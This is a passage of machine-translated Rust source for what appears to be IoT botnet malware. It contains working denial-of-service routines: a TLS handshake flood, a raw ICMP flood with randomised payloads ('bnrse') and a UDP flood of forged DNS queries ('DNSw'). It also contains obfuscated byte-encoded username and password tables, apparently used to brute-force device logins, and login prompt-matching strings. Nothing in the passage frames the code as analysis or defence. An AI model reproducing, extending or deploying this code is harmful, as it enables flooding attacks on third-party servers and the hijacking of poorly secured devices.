                    res = select(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd + 1 as libc::c_int,
                        0 as *mut fd_set,
                        &mut myset,
                        0 as *mut fd_set,
                        &mut tv,
                    );
                    if res == 1 as libc::c_int {
                        lon = ::std::mem::size_of::<libc::c_int>() as libc::c_ulong
                            as socklen_t;
                        getsockopt(
                            (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                            1 as libc::c_int,
                            4 as libc::c_int,
                            &mut valopt as *mut libc::c_int as *mut libc::c_void,
                            &mut lon,
                        );
                        if valopt != 0 {
                            close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 0 as libc::c_int as uint8_t;
                        } else {
                            (*fds.as_mut_ptr().offset(i_0 as isize))
                                .state = 2 as libc::c_int as uint8_t;
                        }
                    } else if res == -(1 as libc::c_int) {
                        close((*fds.as_mut_ptr().offset(i_0 as isize)).fd);
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                2 => {
                    if send(
                        (*fds.as_mut_ptr().offset(i_0 as isize)).fd,
                        b"\x16\x03\x01\0\xA5\x01\0\0\xA1\x03\x03\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0B\x0C\r\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\0\0 \xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\t\xC0\x14\xC0\n\0\x9C\0\x9D\0/\05\xC0\x12\0\n\x01\0\0X\0\0\0\x18\0\x16\0\0\x13example.ulfheim.net\0\x05\0\x05\x01\0\0\0\0\0\n\0\n\0\x08\0\x1D\0\x17\0\x18\0\x19\0\x0B\0\x02\x01\0\0\r\0\x12\0\x10\x04\x01\x04\x03\x05\x01\x05\x03\x06\x01\x06\x03\x02\x01\x02\x03\xFF\x01\0\x01\0\0\x12\0\0\0"
                            as *const u8 as *const libc::c_char as *const libc::c_void,
                        170 as libc::c_int as size_t,
                        MSG_NOSIGNAL as libc::c_int,
                    ) == -(1 as libc::c_int) as libc::c_long
                        && *__errno_location() != 11 as libc::c_int
                    {
                        (*fds.as_mut_ptr().offset(i_0 as isize))
                            .state = 0 as libc::c_int as uint8_t;
                    }
                }
                _ => {}
            }
            i_0 += 1;
        }
    }
}
#[no_mangle]
pub unsafe extern "C" fn bnrse(mut host: *mut libc::c_char, mut secs: libc::c_int) {
    let mut pkt_template: [uint8_t; 36] = [
        0x3 as libc::c_int as uint8_t,
        0x3 as libc::c_int as uint8_t,
        0xd as libc::c_int as uint8_t,
        0x33 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0x45 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0x1c as libc::c_int as uint8_t,
        0x4a as libc::c_int as uint8_t,
        0x4 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0x40 as libc::c_int as uint8_t,
        0x6 as libc::c_int as uint8_t,
        0x20 as libc::c_int as uint8_t,
        0xc5 as libc::c_int as uint8_t,
        0x1 as libc::c_int as uint8_t,
        0x2 as libc::c_int as uint8_t,
        0x3 as libc::c_int as uint8_t,
        0x4 as libc::c_int as uint8_t,
        0x5 as libc::c_int as uint8_t,
        0x6 as libc::c_int as uint8_t,
        0x7 as libc::c_int as uint8_t,
        0x8 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0 as libc::c_int as uint8_t,
        0x8 as libc::c_int as uint8_t,
        0xef as libc::c_int as uint8_t,
        0xc1 as libc::c_int as uint8_t,
    ];
    let mut pkt: *mut uint8_t = 0 as *mut uint8_t;
    let mut addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut pfd: pollfd = pollfd {
        fd: 0,
        events: 0,
        revents: 0,
    };
    let pkt_len: size_t = (::std::mem::size_of::<[uint8_t; 36]>() as libc::c_ulong)
        .wrapping_div(::std::mem::size_of::<uint8_t>() as libc::c_ulong);
    let mut i_0: size_t = 0;
    let mut gai_err: libc::c_int = 0;
    let mut kindy: libc::c_int = 0;
    let mut x_0: libc::c_int = 0;
    let mut get_0: libc::c_int = 0;
    kindy = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_ICMP as libc::c_int,
    );
    if kindy == -(1 as libc::c_int) {
        _exit(1 as libc::c_int);
    }
    bzero(
        &mut addr as *mut sockaddr_in as *mut libc::c_char as *mut libc::c_void,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    addr.sin_family = 2 as libc::c_int as sa_family_t;
    if getHost(host as *mut libc::c_uchar, &mut addr.sin_addr) != 0 {
        return;
    }
    pkt = pkt_template.as_mut_ptr();
    pfd.fd = kindy;
    pfd.events = 0x4 as libc::c_int as libc::c_short;
    let mut end: libc::c_int = (time(0 as *mut time_t) + secs as libc::c_long)
        as libc::c_int;
    loop {
        i_0 = 20 as libc::c_int as size_t;
        while i_0
            < (20 as libc::c_int + 8 as libc::c_int + 4 as libc::c_int) as libc::c_ulong
        {
            *pkt.offset(i_0 as isize) = rand() as uint8_t;
            i_0 = i_0.wrapping_add(1);
        }
        if sendto(
            kindy,
            pkt as *const libc::c_void,
            pkt_len,
            0 as libc::c_int,
            &mut addr.sin_addr as *mut in_addr as *mut sockaddr,
            ::std::mem::size_of::<in_addr>() as libc::c_ulong as socklen_t,
        ) as libc::c_ulong != pkt_len
        {
            if !(*__errno_location() == 105 as libc::c_int) {
                break;
            }
            poll(&mut pfd, 1 as libc::c_int as nfds_t, 1000 as libc::c_int);
        } else {
            if i_0 >= 100 as libc::c_int as libc::c_ulong {
                if time(0 as *mut time_t) > end as libc::c_long {
                    _exit(0 as libc::c_int);
                }
                x_0 = 0 as libc::c_int;
            }
            x_0 += 1;
        }
    }
    close(kindy);
}
#[no_mangle]
pub unsafe extern "C" fn DNSw(
    mut host: *mut libc::c_uchar,
    mut port: libc::c_int,
    mut secs: libc::c_int,
) {
    let mut std_hex: libc::c_int = 0;
    std_hex = socket(2 as libc::c_int, SOCK_DGRAM as libc::c_int, 0 as libc::c_int);
    let mut start: time_t = time(0 as *mut time_t);
    let mut sin: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    bzero(
        &mut sin as *mut sockaddr_in as *mut libc::c_char as *mut libc::c_void,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    if getHost(host, &mut sin.sin_addr) != 0 {
        return;
    }
    sin.sin_family = 2 as libc::c_int as sa_family_t;
    if port == 0 as libc::c_int {
        sin.sin_port = realrand(49152 as libc::c_int, 65535 as libc::c_int) as in_port_t;
    } else {
        sin.sin_port = port as in_port_t;
    }
    let mut a: libc::c_uint = 0 as libc::c_int as libc::c_uint;
    let mut dnspkt: [libc::c_char; 128] = [0; 128];
    let mut dnspkts: [*mut libc::c_char; 9] = [
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x03www\x06google\x03com\0\0\x01\0\x01\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x04live\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x06office\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x08digikala\x03com\0\0\xFF\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\nsalesforce\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x05sogou\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x07discord\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x07wikihow\x03com\0\0\x10\0\x01\0" as *const u8
            as *const libc::c_char as *mut libc::c_char,
        b"%s%s\x01\0\0\x01\0\0\0\0\0\0\x0Emanoramaonline\x03com\0\0\xFF\0\x01\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
    ];
    let mut count: libc::c_int = (::std::mem::size_of::<[*mut libc::c_char; 9]>()
        as libc::c_ulong)
        .wrapping_div(::std::mem::size_of::<*mut libc::c_char>() as libc::c_ulong)
        as libc::c_int;
    loop {
        if a >= 50 as libc::c_int as libc::c_uint {
            if port == 0 as libc::c_int {
                sin
                    .sin_port = realrand(49152 as libc::c_int, 65535 as libc::c_int)
                    as in_port_t;
            }
            memset(
                dnspkt.as_mut_ptr() as *mut libc::c_void,
                0 as libc::c_int,
                128 as libc::c_int as libc::c_ulong,
            );
            sprintf(
                dnspkt.as_mut_ptr(),
                dnspkts[(rand() % count) as usize],
                rand() as libc::c_char as libc::c_int % 255 as libc::c_int,
                rand() as libc::c_char as libc::c_int % 255 as libc::c_int,
            );
            send(
                std_hex,
                dnspkt.as_mut_ptr() as *const libc::c_void,
                strlen(dnspkt.as_mut_ptr()),
                0 as libc::c_int,
            );
            connect(
                std_hex,
                &mut sin as *mut sockaddr_in as *mut sockaddr,
                ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
            );
            if time(0 as *mut time_t) >= start + secs as libc::c_long {
                close(std_hex);
                _exit(0 as libc::c_int);
            }
            a = 0 as libc::c_int as libc::c_uint;
        }
        a = a.wrapping_add(1);
    };
}
#[no_mangle]
pub static mut j83jPid: libc::c_int = 0 as libc::c_int;
#[no_mangle]
pub static mut usernames: [*mut libc::c_char; 99] = [
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"aQu\x90\xE4<9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"a\x90Q\xD4\xB9\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"9Q<\xFFQ9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA4a\xD4\x19\xFF\x19\x039\xE7\x909\xB9\xE7\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD4\xF9\xE2\xCFPP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"aQu\x90\xE4<9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\xD2\xFF9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03\xE4\xA0\xA0\xB9\xE79\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut passwords: [*mut libc::c_char; 98] = [
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03Z\xB9\xE7a\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"#9Q\xCF\x86\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xFC\x19>\xC1\xFC\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"PPPPPP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF*G\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"e\x19\xE2\xCF\xEB\x9A\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEBo\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE4\xF0bx\xB9P\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"PPPPPPPP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x7F\xDB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"x<\xFC\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"x<\xFC\xEBo\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xB9Q<\x19\xFF\xE4\xC1\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xE7Q\x90<9Qx\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEB\xEB\xEB\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xCFo\xE2\x86\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\xFF9\x03<\xCB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b">9Q\xD0\xC1\xEB\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03\"\x039Q\xD4\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF*\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x9A\x9A\x9A\x9A\x9A\x9A\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x19xZ\xD2\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"aQu\x90\xE4<9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF0\xE4\x90\xFF9Q\xCEe\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xC1\xCE\xE2\xCF\xEB\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x03\xE4\xA0\xA0\xB9\xE79\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xEB\xEB\xEB\xEB\xEB\xEB\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x03Q\xE7\xFC\x19\xCEQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"o\xE2\x86\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"9Q\xCEe\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x7F\xDB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\xD2\xCE\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE4\xF0bx\xB9P\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x03Z\x199\xCEe\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEBo\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEB\xEB\xEB\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD4Q\x19\xFF\x03\xD4\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03\xD4\xCE\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xEBo\xCF*G\x9A\xD0P\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03Z\xB9\xE7a\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\xFFx\xB9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xC1\xCE\xE2\xCF\xEB\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xEBo\xCF*\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xC1\xCE\xE2\xCF\xEB\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"#9Q\xCF\x86\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xF9\xE4Q\x039\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03Z\xB9\xE7a\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x19xZ\xD2\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF*G\x9A\xD0P\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF*\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE7\xB9\xB99\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"9Q<\xFFQ9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b">9Q\xD0\xC1\xEB\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD4Q\x19\xFF\x03\xD4\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\xFF9\x03<\xCB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xD4Q\xE7<\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03Z\x199\xCEe\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"G\xE4\xF0bx\xB9P\x90a\xD4\x19\xFF\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x90\xD2\xCE\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x7F\xDB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"9Q\xCEe\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"o\xE2\x86\xEB\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"aQu\x90\xE4<9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03Q\xE7\xFC\x19\xCEQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEB\xEB\xEB\xEB\xEB\xEB\xEB\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\x90a\xD4\x19\xFF\xEBo\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xE4\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"e\x19\xE2\xCF\xEB\x9A\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03Z\xB9\xE7a\0" as *const u8 as *const libc::c_char
        as *mut libc::c_char,
    b"\xE4\xD2\xFF9\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"><\xC1\xC1\x97\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xEBo\xCF*G\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"PPPPPP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut advances: [*mut libc::c_char; 6] = [
    b"\xF1\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x03Q\xE7\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xB9\xF9\x19\xFF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xFF\x90\xD4Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\xA0\x90\x03\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"a\xFC\xE7a\xFC\x03\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
];
#[no_mangle]
pub static mut fails: [*mut libc::c_char; 8] = [
    b"\xFF\xFC\x90<\x19a\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
    b"\x90\x19<Qa\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
